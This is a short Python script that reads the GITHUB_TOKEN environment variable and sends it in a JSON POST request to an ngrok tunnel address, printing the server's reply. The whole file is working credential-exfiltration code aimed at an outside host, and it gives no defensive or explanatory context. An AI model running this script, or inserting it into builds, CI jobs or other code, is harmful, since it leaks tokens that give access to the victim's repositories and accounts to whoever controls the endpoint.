import os
import requests

# Collect the GitHub token from environment variables
github_token = os.getenv("GITHUB_TOKEN")

# Validate presence
if not github_token:
    print("GITHUB_TOKEN not found in environment variables.")
else:
    # Prepare payload
    payload = {"github_token": github_token}

    # Send to your endpoint
    try:
        response = requests.post(
            "https://3dc603701034.ngrok-free.app/",
            json=payload,
            headers={"Content-Type": "application/json"}
        )
        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text}")
    except Exception as e:
        print(f"Error sending request: {e}")

